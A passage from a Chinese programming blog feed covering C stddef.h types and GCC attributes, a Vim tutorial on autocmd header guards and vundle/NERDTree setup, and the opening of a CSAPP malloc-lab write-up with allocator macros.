<code>#include&lt;stddef.h&gt;</code>。</p><table><thead><tr><th>类型</th><th>实质</th><th>描述</th></tr></thead><tbody><tr><td>ptrdiff_t</td><td>signed int</td><td>两个指针相减的结果的有符号整数类型</td></tr><tr><td>size_t</td><td>unsigned int</td><td>通常用于数组的索引以及表示变量存储空间的大小</td></tr><tr><td>wchar_t</td><td>int</td><td>宽字节字符类型，可以表示，在支持的语言环境中，指定的最大扩展字符集的所有成员</td></tr><tr><td>nullptr_t<sup>C++11</sup></td><td>关键字<code>nullptr</code>的类型</td><td>该类型表示它不是指向某个东西的指针类型，当多个重载函数接收不同的指针类型时，重载一个接收<code>std::nullptr_t</code>用于处理传入null指针的情况</td></tr><tr><td>max_align_t<sup>C++11</sup></td><td>实现定义</td><td>一种对齐要求，至少与每个标量类型一样严格（大）的类型</td></tr><tr><td>NULL</td><td>宏 （void*) 0 or 0</td><td>C语言中表示空指针，但在C++中仅表示0，C++中的空指针推荐使用<code>nullptr</code></td></tr></tbody></table><h2 id="六、GNC-C中的Attributes">六、GNC C中的Attributes</h2><p>在GNC C中，可以将你要调用的函数用“特殊的东西”声明，可以帮助编译器优化你的函数，并可以帮你挑出一些更加细微的错误。</p><p>那么这些<strong>特殊的东西</strong>，就是这里介绍的关键字<code>__attribute__</code>了。在声明时，它可以帮你给函数设定一个特殊的属性。这个关键字通常会带有如下几个东西：</p><ul><li><p>noreturn</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">err_sys</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> * fmt, ...)</span> __<span class="hljs-title">attribute__</span><span class="hljs-params">((noreturn))</span></span><br></code></pre></td></tr></table></figure><p>通常用在一些标准库函数中，例如<code>abort</code>或者<code>exit</code>，意思是不能<code>return</code>，GCC会得知这一点，并且GCC就会对其进行优化：<strong>不会考虑如果<code>err_sys</code>出现返回值的情况</strong>。更重要的是，可以避免出现未初始化变量的警告。</p></li><li><p>noinline</p><p>阻止函数内联。</p></li></ul><p>事实上，GCC的attribute有三大类：</p><ul><li>Function attributes described <a href="http://gcc.gnu.org/onlinedocs/gcc/Function-Attributes.html">here</a></li><li>Variable attributes described <a href="http://gcc.gnu.org/onlinedocs/gcc/Variable-Attributes.html">here</a></li><li>Type attributes described <a href="http://gcc.gnu.org/onlinedocs/gcc/Type-Attributes.html">here</a></li></ul><p>这里就不一一介绍了。</p>]]></content>
    
    
    <categories>
      
      <category>Cpp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>熟练使用 Vim</title>
    <link href="/2021/08/22/2021-8-22-VimTech/"/>
    <url>/2021/08/22/2021-8-22-VimTech/</url>
    
    <content type="html"><![CDATA[<h1>Vim 小技巧</h1><h2 id="情景一：自动写入文件头">情景一：自动写入文件头</h2><p>在编写 C++ 程序时，总有一些东西会在每个头文件中出现，比如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> <span class="hljs-string">&lt;_File_Name_MACRO_&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> <span class="hljs-string">&lt;_File_Name_MACRO_&gt;</span></span><br><span class="hljs-comment">// ...</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// &lt;_File_Name_MACRO_&gt;</span></span><br></code></pre></td></tr></table></figure><p>每次键入这些信息会非常枯燥。但只要配置好 Vim ，就可以逃避这些烦人的操作。我们可以在 .vimrc 中将需要每次键入的信息写在一个函数内，每次在创建一个特定文件时（比如 .cpp），vim 会帮我们自动把这些信息写好。下面我来介绍一下使用方法，<em>如有需要，直接拉到最后复制粘贴</em>。</p><h3 id="autocmd">autocmd</h3><p>vim 中自带的自动命令，会在<strong>指定事件发生时</strong>自动执行。我们正打算利用这一特性，迅速完成上面场景的要求，将重复的操作自动化，提高编辑效率并减少人为操作的差错。</p><p>先从最简单的开始举例，vim 中可定义以下函数，用于在文件中插入当前日期：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">:<span class="hljs-keyword">function</span> DateInsert()<br>:    <span class="hljs-variable">$read</span> !<span class="hljs-built_in">date</span><br>:endfunction<br></code></pre></td></tr></table></figure><p>而使用以下命令，可以手动调用此函数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">:call DateInsert()<br></code></pre></td></tr></table></figure><p>但每次调用函数有点太过麻烦，我们使用自动命令，在保存文件时自动执行函数，其中 <code>FileWritePre</code> 是 vim 中的内置事件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">:autocmd FileWritePre * :call DateInsert()<br></code></pre></td></tr></table></figure><p>上一句话可以简单地翻译为：“在写入文件前，需要自动执行命令 <code>call DateInsert()</code>”。可用简写 <code>:au</code> 代替 <code>:autocmd</code>。内置事件有很多种，参考<a href="https://zhuanlan.zhihu.com/p/98360630">知乎专栏</a>罗列在此，官方文档可见 <a href="http://vimdoc.sourceforge.net/htmldoc/autocmd.html">Vim Doc</a>：</p><p><img src="/img/vim_event.jpg" alt=""></p><hr><p>简单的例子介绍完了，再回到情景一的问题中，结合上面给出的表格，如果要想在创建新的 <code>.hpp</code> 文件后，让 vim 自动添加文件头，那么应当在 <code>vimrc</code> 中添加：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 自定义命令，发生在编辑新的文件时，且文件名后缀为hpp，需要执行&quot;call AddHPPHeader&quot;</span><br>autocmd BufNewFile *.hpp <span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;:call AddHPPHeader()&quot;</span><br></code></pre></td></tr></table></figure><p>现在，每次打开一个新的 .hpp 文件后，vim 都会帮我们自动执行命令 <code>call AddHPPHeader()</code>。</p><h3 id="关于函数">关于函数</h3><p>那么，<code>AddHPPHeader</code> 函数应该怎么写呢？首先，在 <code>vimrc</code> 中，需要定义函数 <code>AddHPPHeader</code> ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">func AddHPPHeader()<br><span class="hljs-comment"># ...</span><br>endfunc<br></code></pre></td></tr></table></figure><p>函数内，第一步就是判断文件类型是否为 <code>.hpp</code>。这里使用 <code>expand()</code> 内置函数可以对当前文件进行分类。<code>expand(&quot;%:e&quot;)</code> 中，<code>%</code> 表示当前文件名，而 <code>:e</code> 表示只有扩展名，于是该函数返回的是当前文件名的扩展名。如果文件是 <code>hpp</code>，就添加文件头：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> <span class="hljs-built_in">expand</span>(<span class="hljs-string">&quot;%:e&quot;</span>) == <span class="hljs-string">&#x27;hpp&#x27;</span><br><span class="hljs-comment"># 先限定在文件的第一行</span><br>call setline(1, <span class="hljs-string">&quot;/** &quot;</span>)<br><span class="hljs-comment"># 再一行一行地添加内容</span><br></code></pre></td></tr></table></figure><p>添加文件头内容时，有很多办法，最简单的就是使用 <code>setline</code> 函数一行一行地写：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">call setline(line(<span class="hljs-string">&#x27;.&#x27;</span>)+1, <span class="hljs-string">&quot;#ifndef XXXX&quot;</span>)<br>call setline(line(<span class="hljs-string">&#x27;.&#x27;</span>)+2, <span class="hljs-string">&quot;#define XXXX&quot;</span>)<br>call setline(line(<span class="hljs-string">&#x27;.&#x27;</span>)+5, <span class="hljs-string">&quot;#endif // XXXX&quot;</span>)<br></code></pre></td></tr></table></figure><p>这里的XXXX被我们写死在了 <code>.vimrc</code> 中，这样不够灵活，试想若换一个文件，宏定义的具体内容必然需要改变，那岂不是又要修改 <code>.vimrc</code> 了？</p><p>使用变量才能保证宏定义可以随着文件名等条件变化。</p><h3 id="关于变量">关于变量</h3><p>vim 中，变量使用 <code>let</code> 进行<strong>赋值</strong>，通过 <code>unlet</code> <strong>销毁变量</strong> ，可用 <code>echo</code> 打印变量的值。对于 Vim 选项还可用 <code>set</code> 来更方便地操作，比如 <code>set &#123;option&#125;</code>, <code>set no&#123;option&#125;</code>, <code>set &#123;option&#125;?</code>。</p><p>与 bash 中的变量类似，普通变量可以直接引用，环境变量要加前缀 <code>$</code>、寄存器变量要加前缀 <code>@</code>、Vim 选项要加前缀 <code>&amp;</code>。如，在正常模式下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">:<span class="hljs-built_in">let</span> str = <span class="hljs-string">&quot;Hello World&quot;</span><br>:<span class="hljs-built_in">echo</span> str<br>:<span class="hljs-built_in">let</span> <span class="hljs-variable">$PATH</span> .= <span class="hljs-string">&#x27;:/foo:/bar&#x27;</span><br>:<span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br><span class="hljs-comment"># 打印当前文件名</span><br><span class="hljs-built_in">echo</span> @%<br><span class="hljs-comment"># 把刚才拷贝的内容放到 a 寄存器中</span><br><span class="hljs-built_in">let</span> @a = @<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><code>.=</code> 运算符在 Vim 中用来做字符串拼接并赋值。</p><p>Vim 选项是控制着 Vim 编辑器行为的一些变量，比如是否显示行号，使用哪种剪切板。 引用选项变量时需要添加 <code>&amp;</code> 前缀。例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 显示行号</span><br>:<span class="hljs-built_in">let</span> &amp;number = 1<br><span class="hljs-comment"># 不显示行号</span><br>:<span class="hljs-built_in">let</span> &amp;number = 1<br></code></pre></td></tr></table></figure><p>Vim 提供了 <code>set</code> 命令来更方便地操作选项变量，网上相关内容很多，这里不再赘述。</p><p>变量作用域值得一提，变量默认作用域取决于定义的位置，函数内则为函数作用域，外部则为全局变量。 赋值和引用变量时可以使用 <code>b:</code>,<code>g:</code>,<code>l:</code>,<code>t:</code> 等前缀来指定要操作哪个作用域的变量。</p><table><thead><tr><th>变量作用域</th><th>简写</th><th>描述</th></tr></thead><tbody><tr><td>buffer-var</td><td>b:</td><td>Local to the current buffer</td></tr><tr><td>window-var</td><td>w:</td><td>Local to the current window</td></tr><tr><td>tabpage-var</td><td>t:</td><td>Local to the current tab page</td></tr><tr><td>global-var</td><td>g:</td><td>Global variable</td></tr><tr><td>local-var</td><td>l:</td><td>Local to a function</td></tr><tr><td>vim-var</td><td>v:</td><td>Global, predefined by Vim</td></tr><tr><td>function-arg</td><td>a:</td><td>Function argument (only inside function)</td></tr></tbody></table><p>回到我们要解决的问题上来，先定义一个 Vim 变量，通常宏定义都是大写，因此需要用到 <code>toupper</code> 函数将小写的文件名变为大写。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">let</span> str = <span class="hljs-string">&quot;Hello, Vim&quot;</span><br><span class="hljs-built_in">echo</span> toupper(str)<br><span class="hljs-comment"># 输出为 HELLO, VIM</span><br></code></pre></td></tr></table></figure><p>考虑到，文件名路径通常包含 <code>/</code> 和 <code>.</code> 等符号，这对宏定义来说是非法的。要使用 <code>substitute</code> 将非法符号替换为 <code>_</code> 。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">substitute(<span class="hljs-built_in">expand</span>(<span class="hljs-string">&#x27;%&#x27;</span>), <span class="hljs-string">&quot;[/.]&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;g&quot;</span>)<br></code></pre></td></tr></table></figure><p><code>substitute</code> 的第一个参数是要修改的字符串，第二个是 pattern，第三个是替换的子串，第四个是替换的 flags，上面这句话将文件名路径中的 <code>/</code> 和 <code>.</code> 都替换为 <code>_</code> 。</p><p>综合以上几点，可以如下定义 Vim 变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">let</span> macro= <span class="hljs-string">&quot;_DF_&quot;</span>.toupper(substitute(<span class="hljs-built_in">expand</span>(<span class="hljs-string">&quot;%&quot;</span>), <span class="hljs-string">&quot;[/.]&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;g&quot;</span>)).<span class="hljs-string">&quot;_&quot;</span><br></code></pre></td></tr></table></figure><p>其中，<code>.</code> 在 Vim 中充当字符串连接符。如果当前文件名为 <code>process.hpp</code> ，那么 <code>macro</code> 变量的值为 <code>_DF_PROCESS_HPP_</code>。</p><h3 id="总结">总结</h3><p>最后，我们得到了一个简短有用的 Vim 自动化脚本，可以有效地解决情景一提出的问题。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">autocmd</span> BufNewFile *.hpp exec <span class="hljs-string">&quot;:call AddHPPHeader()&quot;</span><br><br>func AddHPPHeader()<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">expand</span>(<span class="hljs-string">&quot;%:e&quot;</span>) == <span class="hljs-string">&#x27;hpp&#x27;</span><br>        # 先限定在文件的第一行<br>        <span class="hljs-keyword">call</span> <span class="hljs-built_in">setline</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;/** &quot;</span>)<br>        # 再一行一行地添加内容<br>        <span class="hljs-keyword">let</span> macro= <span class="hljs-string">&quot;_DF_&quot;</span>.<br>        <span class="hljs-built_in">toupper</span>(<span class="hljs-keyword">substitute</span>(<span class="hljs-built_in">expand</span>(<span class="hljs-string">&quot;%&quot;</span>), <span class="hljs-string">&quot;[/.]&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;g&quot;</span>)).<span class="hljs-string">&quot;_&quot;</span><br>        <span class="hljs-keyword">normal</span> <span class="hljs-keyword">o</span><br>        <span class="hljs-keyword">call</span> <span class="hljs-built_in">setline</span>(<span class="hljs-built_in">line</span>(<span class="hljs-string">&#x27;.&#x27;</span>), <span class="hljs-string">&quot;#ifndef &quot;</span>.macro)<br>        <span class="hljs-keyword">call</span> <span class="hljs-built_in">setline</span>(<span class="hljs-built_in">line</span>(<span class="hljs-string">&#x27;.&#x27;</span>)+<span class="hljs-number">1</span>, <span class="hljs-string">&quot;#define &quot;</span>.macro)<br>        <span class="hljs-keyword">call</span> <span class="hljs-built_in">setline</span>(<span class="hljs-built_in">line</span>(<span class="hljs-string">&#x27;.&#x27;</span>)+<span class="hljs-number">4</span>, <span class="hljs-string">&quot;#endif // &quot;</span>.macro)<br>endfunc<br></code></pre></td></tr></table></figure><h2 id="情景二：vundle工具和nerd文件树">情景二：vundle工具和nerd文件树</h2><h3 id="vundle-插件管理器">vundle 插件管理器</h3><p>许多 vim 的第三方插件可以让工作变得更加简单。但首先，我们需要安装一个<strong>管理插件</strong>的插件 vundle，其安装方式很简单，把它的 git 仓库存在 <code>.vim/bundle</code> 下就行了，执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/gmarik/vundle.git ~/.vim/bundle/vundle<br></code></pre></td></tr></table></figure><p>随后，我们需要在 <code>.vimrc</code> 上使用这个插件管理器，使用方法很简单：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">set</span> rtp+=~/.<span class="hljs-keyword">vim</span>/bundle/Vundle.<span class="hljs-keyword">vim</span><br><span class="hljs-keyword">call</span> vundle#begin()<br><span class="hljs-comment">&quot; VundleVim/Vundle.vim</span><br>Plugin <span class="hljs-string">&#x27;VundleVim/Vundle.vim&#x27;</span><br><span class="hljs-comment">&quot; The Nerd Tree</span><br>Plugin <span class="hljs-string">&#x27;preservim/nerdtree&#x27;</span><br><span class="hljs-comment">&quot; Vim airline</span><br>Plugin <span class="hljs-string">&#x27;vim-airline/vim-airline&#x27;</span><br><span class="hljs-keyword">call</span> vundle#end()<br></code></pre></td></tr></table></figure><p>好，复制完上面这段代码后，我们来挨个看看他们的意思。第一句 <code>set</code> 命令是在指定 vundle 插件的运行路径，方便进行初始化操作。随后，<code>call vundle#begin()</code> 启动 vundle ，开始进行插件管理。之后紧跟的三句话表示我们的 vim 会使用到如下三个插件：Vundle.vim、nerdtree 和vim-airline ，请求 vundle 对这三个插件进行管理。最后 <code>call vundle#end()</code> 表示 vundle 管理结束。</p><h3 id="nerd-文件树">nerd 文件树</h3><p>使用 nerd 文件树目录可以方便我们在打开 vim 的同时看到我们目前所处的文件路径和文件树结构。其安装方法与 vundle 一样简单便捷，只需执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/preservim/nerdtree.git ~/.vim/bundle/nerdtree<br></code></pre></td></tr></table></figure><p>即可完成下载和安装。但此时你打开 vim ，你仍无法看到文件树，需要输入<code>:NERDTreeToggle</code> 才能打开。我们可以利用在情景一中的小知识，使用 <code>autocmd</code> 来自动完成打开 vim 即打开文件树目录的操作：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">autocmd</span> vimenter * NERDTree<br></code></pre></td></tr></table></figure><p>受限于 vim 平台本身，nerdtree 的使用有些小门槛，需要使用它提供的环境变量与它更好地配合，下表分享一下常用的 nerdtree 变量：</p><table><thead><tr><th>变量名</th><th>描述</th><th>值</th></tr></thead><tbody><tr><td>NERDTreeDirArrowExpandable</td><td>设置树的显示图标，该图标表示这层目录可以被展开</td><td>字符</td></tr><tr><td>NERDTreeDirArrowCollapsible</td><td>设置树的显示图标，该图标表示这层目录已经被展开</td><td>字符</td></tr><tr><td>NERDTreeIgnore</td><td>用于过滤所有列表中的文件</td><td>例如[‘\.tmp<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><msup><mo separator="true">,</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mspace linebreak="newline"></mspace><mi mathvariant="normal">.</mi><mi>g</mi><mi>i</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">&#x27;, &#x27;\\.git</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9463em;vertical-align:-0.1944em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct"><span class="mpunct">,</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span></span></span></span>’] 表示所有扩展名为 .tmp 或 .git 的文件都不会显示在上面</td></tr><tr><td>NERDTreeShowLineNumbers</td><td>指示 nerd 的窗口是否需要显示行号</td><td>1 为需要</td></tr><tr><td>NERDTreeMinimalUI</td><td>是否需要最小化 UI</td><td>为 1 时不显示 ‘Press ? for help’</td></tr><tr><td>NERDTreeWinSize</td><td>指定文件树占用的窗口宽度</td><td>宽度值</td></tr></tbody></table><p>顺便秀一下我的配置吧：</p><p><img src="/img/ui4nerdtree.png" alt="img"></p><p>关于 nerdtree 的使用，还有许多有趣的小技巧分享给大家：</p><ul><li>nerdtree 的刷新：打开的 vim 中，Nerdtree 目录结构是不会自动刷新的，需要按 r 手动进行刷新</li><li>恢复显示隐藏的文件：在 nerdtree 中按 Ctrl-I（大写）</li></ul>]]></content>
    
    
    <categories>
      
      <category>Miscellaneous</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Vim</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入理解计算机系统之动态存储分配器实现</title>
    <link href="/2021/07/05/2021-7-5-CSAPPLab05/"/>
    <url>/2021/07/05/2021-7-5-CSAPPLab05/</url>
    
    <content type="html"><![CDATA[<h1>深入理解计算机系统之实现动态存储分配器</h1><h2 id="简介">简介</h2><p>本实验需要用 C 语言实现一个动态的存储分配器，也就是你自己版本的 <code>malloc</code>，<code>free</code>，<code>realloc</code> 函数。我们需要修改的唯一文件是 <code>mm.c</code>，包含如下几个需要实现的函数：</p><ul><li><code>int mm_init(void);</code> 在调用 <code>mm_malloc</code>，<code>mm_realloc</code> 或 <code>mm_free</code> 之前，调用 <code>mm_init</code> 进行初始化，正确返回 0</li><li><code>void *mm_malloc(size_t size);</code> 在堆区域分配指定大小的块，分配的空间，返回的指针应该是 8 字节对齐的</li><li><code>void mm_free(void *ptr);</code> 释放指针指向的 block</li><li><code>void *mm_realloc(void *ptr, size_t size)</code> 返回指向一个大小为size的区域指针，满足一下条件</li></ul><h3 id="动态内存申请">动态内存申请</h3><p>使用<strong>动态内存分配器</strong>，可为在程序运行时确定并申请虚拟内存空间。动态内存分配器管理的区域被称作<strong>堆</strong>。每个进程的内存分布如下：</p><p><img src="/img/CSAPP/lab5/heap.jpg" alt=""></p><p>动态内存申请器将堆这块区域当作一系列大小不同的块来管理，块或者已分配的，或者是空闲的。</p><h3 id="malloc-free">malloc &amp; free</h3><p>通常，有关内存管理， Linux 提供的系统调用主要有两种：<br>第一个是 <code>sbrk()</code> 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-comment">// brk的作用是将堆顶指针设置为addr，失败返回0，成功返回1</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">brk</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *addr)</span>;<br><span class="hljs-comment">// sbrk的作用是将堆顶指针增加incr个字节，成功返回新的堆顶地址</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">sbrk</span><span class="hljs-params">(<span class="hljs-type">intptr_t</span> incr)</span>;<br></code></pre></td></tr></table></figure><p>第二种方法使用的是 <code>mmap()</code> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-comment">// start 指针表示想要映射的内存区域的起始地址，length为映射的大小，prot是保护标志，flags是映射的类型(匿名映射使用MAP_ANONYMOUS参数)，offset是偏移量</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *start, <span class="hljs-type">size_t</span> length, <span class="hljs-type">int</span> prot, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> offset)</span>;<br><span class="hljs-comment">// munmap则是将映射的空间还给操作系统</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">munmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *start, <span class="hljs-type">size_t</span> length)</span>;<br></code></pre></td></tr></table></figure><p>值得注意的是，<code>mmap()</code> 还有另一个重要的作用就是实现快速的 I/O，它通过直接将文件映射到虚拟内存，可以直接对其进行读写操作，而不需要使用系统调用 read/write，大幅度提高了速度。</p><p>但在实际的使用中，我们不可能每次需要内存的时候，都用 <code>sbrk</code> 或 <code>mmap</code> 函数(系统调用速度很慢)，这会大幅度降低我们程序的效率。通常我们采用的是一种类似于缓存的思想：先使用 <code>sbrk</code> 函数向内核索取一大片的内存空间，然后再使用一定的手段对这段空间进行管理。只有当这段空间不够用时，再向内核拿，这样就提高了效率。这也正是 <code>malloc</code> 函数库所起到的作用。</p><p>简单来说，<code>malloc</code> 函数主要是通过维护一个空闲列表来实现内存的管理的，具体涉及到的数据结构就是链表。对每一个内存块，我们使用链表将它们串在一起，当需要使用的时候，我们从链表中寻找大小适合的内存块，并且从空闲链表中删除，拿给用户。当用户用完某个内存块的时候，我们就将其重新插入回空闲链表，这样就实现了简单的内存分配和释放。</p><h2 id="数据结构">数据结构</h2><p>首先介绍实验中的内存分配块的数据结构，我使用边界标记的堆块的格式区分块的边界。其中，头部 (header) 和脚部 (footer) 分别占 4 字节大小，块地址双字对齐，大小为8的整数倍。这样做的好处是，如果用 32 位来存储块大小，低 3 位肯定都为0，相当于低 3 位可以预留出来，用作指示该块是否是一个空闲块。</p><p><img src="/img/CSAPP/lab5/block.jpg" alt=""></p><p>块的数据结构确定后，需要一个空闲链表来管理空闲块，参考书本上关于空闲链表的表述，也采用下图方式管理。</p><p><img src="/img/CSAPP/lab5/freeblocks.png" alt=""></p><h2 id="具体实现">具体实现</h2><h3 id="宏定义">宏定义</h3><p>对于这个实验来说，良好的宏定义可提高编程效率，方便阅读书写代码。下面列出部分关键宏，并加以解释。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> WSIZE 4             <span class="hljs-comment">/* Word and header/footer size (bytes) */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DSIZE 8             <span class="hljs-comment">/* Double word size (bytes) */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CHUNKSIZE (1&lt;&lt;12)   <span class="hljs-comment">/* Extend heap by this amount (bytes) */</span></span><br><br><span class="hljs-comment">/* Pack a size and allocated bit into a word */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACK(size,alloc)    ((size) | (alloc))</span><br><br><span class="hljs-comment">/* Read and Write a word at address p */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GET(p)  (*(unsigned int *)(p))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUT(p,val)  (*(unsigned int *)(p) = (val))</span><br><br><span class="hljs-comment">/* Read the size and allocated fields from address p */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GET_SIZE(p)  (GET(p) &amp; ~0x7)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GET_ALLOC(p)    (GET(p) &amp; 0x1)</span><br><br><span class="hljs-comment">/* Given block ptr bp, compute address of its header and footer */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HDRP(bp)    ((char *)(bp)-WSIZE)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FTRP(bp)    ((char *)(bp)+GET_SIZE(HDRP(bp))-DSIZE)</span><br><br><span class="hljs-comment">/* Given block ptr bp, compute address of next and prev blocks */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NEXT_BLKP(bp)   ((char *)(bp)+GET_SIZE(((char *)(bp)-WSIZE)))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> 